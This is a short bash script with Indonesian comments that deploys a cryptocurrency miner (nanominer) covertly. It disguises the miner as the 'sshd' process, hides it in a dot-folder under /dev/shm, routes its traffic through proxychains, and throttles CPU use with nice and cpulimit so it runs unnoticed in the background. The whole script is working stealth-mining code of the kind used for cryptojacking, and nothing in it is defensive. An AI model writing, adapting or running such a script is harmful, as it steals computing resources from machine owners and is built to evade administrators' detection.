#!/bin/bash

# Nama proses penyamaran
PROC_NAME="sshd"

# Folder tersembunyi
MINER_DIR="/dev/shm/.cache"
MINER_BIN="$MINER_DIR/$PROC_NAME"
CONFIG_FILE="$MINER_DIR/config.ini"

# Pastikan direktori ada
mkdir -p $MINER_DIR

# Pindahkan file miner jika belum ada
if [ ! -f "$MINER_BIN" ]; then
    mv nanominer $MINER_BIN
    chmod +x $MINER_BIN
fi

# Pindahkan config jika belum ada
if [ ! -f "$CONFIG_FILE" ]; then
    mv config.ini $CONFIG_FILE
fi

# Cek apakah miner sudah berjalan
if pgrep -x "$PROC_NAME" > /dev/null
then
    echo "$PROC_NAME sudah berjalan!"
    exit 1
fi

# Jalankan miner dengan proxychains, nice, dan cpulimit
nohup ~/.local/bin/proxychains4 -f ~/.proxychains/proxychains.conf \
      nice -n 19 \
      cpulimit -e $PROC_NAME -l 50 -- \
      $MINER_BIN -c $CONFIG_FILE > /dev/shm/.cache/log.txt 2>&1 &

echo "Miner berhasil dijalankan dengan aman!"
